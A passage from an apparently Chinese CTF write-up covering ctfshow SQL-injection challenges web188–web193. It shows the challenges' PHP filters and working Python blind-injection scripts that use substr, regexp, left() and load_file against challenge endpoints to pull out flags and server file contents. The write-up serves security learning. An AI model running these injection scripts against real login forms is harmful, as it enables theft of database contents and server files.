class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//密码检测</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'密码只能为数字'</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//密码判断</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'登陆成功'</span><span class="token punctuation">;</span>    <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">=></span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    </code></pre><p>payload是：<code>username=0 password=0</code></p><p>在比较查询的时候，查询语句为：<code>select pass from ctfshow_user where username = 0 and password = 0;</code>，由于<code>username password</code>是字符串，弱比较成了0,0&#x3D;0成立，所条件就成立了；最后查询语句就成了：<code>select pass from ctfshow_user where 1;</code></p><p>[<img src="web188.png" loading="lazy"></p><h4 id="web189-locate-load-file"><a href="#web189-locate-load-file" class="headerlink" title="web189(locate load_file)"></a>web189(locate load_file)</h4><p><strong>Hint</strong>：flag在api&#x2F;index.php文件中</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//用户名检测</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'用户名非法'</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//密码检测</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'密码只能为数字'</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//密码判断</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'登陆成功'</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   </code></pre><p>根据提示，先利用locate定位flag的位置，然后使用盲注来得到flag</p><blockquote><p>LOCATE(字符串1,字符串2)</p><p>返回字符串1在字符串2中第一次出现的位置，只要字符串2中包含字符串1，那么返回值必然大于0。</p></blockquote><blockquote><p>username&#x3D;0、password&#x3D;0时，返回“密码错误”。（说明存在用户，但是密码错误）<br>username&#x3D;1、password&#x3D;0时，返回“查询失败”。（说明用户不存在）</p></blockquote><p>可以利用以上返回情况来进行if逐字符盲注</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'https://deb43701-a2f5-42bf-817a-f374b486bcdf.challenge.ctf.show/api/'</span><span class="token keyword">def</span> <span class="token function">getFlagIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    head <span class="token operator">=</span> <span class="token number">1</span>    tail <span class="token operator">=</span> <span class="token number">300</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"if(locate('ctfshow&#123;',"</span> <span class="token operator">+</span> <span class="token string">"load_file('/var/www/html/api/index.php'))>&#123;&#125;,0,1)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"密码错误"</span> <span class="token operator">==</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tail <span class="token operator">=</span> mid    <span class="token keyword">return</span> mid<span class="token keyword">def</span> <span class="token function">getFlag</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    index <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span>    flag <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> index <span class="token operator">+</span> <span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        head <span class="token operator">=</span> <span class="token number">32</span>        tail <span class="token operator">=</span> <span class="token number">127</span>        <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>            mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>            data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"if(ascii(substr(load_file('/var/www/html/api/index.php'),&#123;0&#125;,1))>&#123;1&#125;,0,1)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>            <span class="token punctuation">&#125;</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"密码错误"</span> <span class="token operator">==</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                tail <span class="token operator">=</span> mid            <span class="token comment"># mid += 1</span>        <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    mid <span class="token operator">=</span> getFlagIndex<span class="token punctuation">(</span><span class="token punctuation">)</span>    getFlag<span class="token punctuation">(</span>mid<span class="token punctuation">)</span></code></pre><p>还有一个没有采用二分算法的</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://dc02940d-e22b-4796-ab0f-04bdf57d3a9f.challenge.ctf.show/api/"</span>flagstr <span class="token operator">=</span> <span class="token string">"&#125;&#123;&lt;>$=,;_ 'abcdefghijklmnopqr-stuvwxyz0123456789"</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token comment">#这个位置，是群主耗费很长时间跑出来的位置~</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">257</span><span class="token punctuation">,</span><span class="token number">257</span><span class="token operator">+</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> x <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"if(substr(load_file('/var/www/html/api/index.php'),&#123;&#125;,1)=('&#123;&#125;'),1,0)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"0"</span><span class="token punctuation">&#125;</span><span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span><span class="token comment"># 8d25是username=1时的页面返回内容包含的，具体可以看上面的截图~</span><span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"8d25"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"++++++++++++++++++ &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>flag<span class="token operator">+=</span>x<span class="token keyword">break</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">continue</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><h4 id="web190-常规bool-blind"><a href="#web190-常规bool-blind" class="headerlink" title="web190(常规bool blind)"></a>web190(常规bool blind)</h4><p>输入 admin&#x2F;123 输出密码错误</p><p>输入 test&#x2F;123 输出用户名不存在</p><p>说明存在账号 admin</p><hr><p>输入 admin’ and 1&#x3D;1 # 输出密码错误</p><p>输入 admin’ and 1&#x3D;2 # 输出用户名不存在</p><p>说明存在布尔盲注的条件</p><hr><p>pass 长度为5 值为 admin</p><p>admin’ and length(pass) &#x3D; 5 #</p><p>admin’ and pass &#x3D; ‘admin’ #</p><p>说明 flag 并不是 pass 的值</p><p>接下来就是正常的盲注</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'https://55202cb2-6c46-4248-a593-31a004489e2a.challenge.ctf.show/api/'</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># 查数据库  ctfshow_fl0g,ctfshow_user</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># 查字段  id,f1ag</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select f1ag from ctfshow_fl0g"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin' and if(ascii(substr((&#123;0&#125;),&#123;1&#125;,1))>&#123;2&#125;,1,2)='1"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> i<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"密码错误"</span><span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tail <span class="token operator">=</span> mid    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web191-ord"><a href="#web191-ord" class="headerlink" title="web191(ord)"></a>web191(ord)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//TODO:感觉少了个啥，奇怪</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file|into|ascii/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'用户名非法'</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><p>ban了ascii，可以使用ord</p><h4 id="web192-regexp"><a href="#web192-regexp" class="headerlink" title="web192(regexp)"></a>web192(regexp)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//TODO:感觉少了个啥，奇怪</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file|into|ascii|ord|hex/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'用户名非法'</span><span class="token punctuation">;</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><p><code>ord</code> <code>hex</code>都被ban了</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> stringurl <span class="token operator">=</span> <span class="token string">'https://672395a7-518e-4be5-b990-8af1ef5202c4.challenge.ctf.show/api/'</span>flagstr <span class="token operator">=</span> <span class="token string">" _&#123;&#125;-"</span> <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digitsflag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>        <span class="token comment"># 查数据库  ctfshow_fl0g,ctfshow_user</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># 查字段  id,f1ag</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select group_concat(f1ag) from ctfshow_fl0g"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"admin' and if(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)regexp('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">'),1,2)='1"</span></span><span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token number">1</span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"密码错误"</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token string">'&#125;'</span><span class="token punctuation">:</span>                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><h4 id="web193-left-right"><a href="#web193-left-right" class="headerlink" title="web193(left right)"></a>web193(left right)</h4><p>过滤了<code>file|into|ascii|ord|hex|substr</code>，substr没了，可以用<code>left() right()</code>，其实也可以用<code>mid()</code>，这里将数据库名字给改了，和192的不一样，需要重新构造一个用来查询的语句。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://df755a50-9318-495a-9788-1c5c721b44e2.challenge.ctf.show:8080/api/"</span>flagstr<span class="token operator">=</span><span class="token string">"abcdefghijklmnopqrstuvwxyz1234567890_&#123;-&#125; ,"</span>flag<span class="token operator">=</span><span class="token string">"ctf"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>        change<span class="token operator">=</span>flag<span class="token operator">+</span>j        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"admin' and if(left((select group_concat(f1ag)from ctfshow_flxg),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">)regexp('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>change<span class="token punctuation">&#125;</span></span><span class="token string">'),1,0)=1#"</span></span>        <span class="token comment">#payload = f"admin' and if((select group_concat(f1ag)from ctfshow_flxg)regexp('&#123;change&#125;'),1,0)=1#"</span>        <span class="token comment">#第二个payload没有使用截断字符串的函数，直接使用regexp进行的匹配</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>        <span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"密码错误"</span> <span class="token operator">==</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span></code></pre><p>可以将payload的left给去掉，直接正则匹配，不过需要起一个’ctfshow{‘的头就行就行。Y4大佬的做法是，将<code>&#123;</code>放到了<code>flagstr</code>的前边</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> stringurl <span class="token operator">=</span> <span class="token string">"https://d8ecee4e-9c33-46b3-af79-befbc602b859.challenge.ctf.show/api/"</span>flagstr <span class="token operator">=</span> <span class="token string">" _&#123;&#125;-"</span> <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digitsflag <span class="token operator">=</span> <span class="token string">'ctf'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>        tmp <span class="token operator">=</span> flag <span class="token operator">+</span> j        <span class="token comment"># 查数据库  ctfshow_flxg,ctfshow_user</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># 查字段  id,f1ag</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flxg'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select group_concat(f1ag) from ctfshow_flxg"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"admin' and if((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">)regexp('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>tmp<span class="token punctuation">&#125;</span></span><span class="token string">'),1,2)='1"</span></span><span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"密码错误"</span> <span class="token operator">==</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"&#125;"</span> <span class="token operator">==</span> j<span class="token punctuation">:</span>                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><p>二分法依然可行，只是并不是单独的字符比较，是字符串的比较，但原理是一样的。<br>即：ab&#x3D;ab，ab&lt;ac，是对字符串不一致的第一字符进行比较。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> sys<span class="token keyword">import</span> time<span class="token keyword">import</span> stringurl <span class="token operator">=</span> <span class="token string">"http://fa58a58a-11d4-4c3e-9009-e7a0c53565b8.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">max</span> <span class="token operator">=</span> <span class="token number">127</span>    <span class="token builtin">min</span> <span class="token operator">=</span> <span class="token number">32</span>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">max</span><span class="token operator">+</span><span class="token builtin">min</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">min</span> <span class="token operator">==</span> mid<span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>        payload <span class="token operator">=</span> <span class="token string">"admin'and ((left((select f1ag from ctfshow_flxg),&#123;&#125;)&lt;'&#123;&#125;'))#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>flag<span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#print(payload)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token 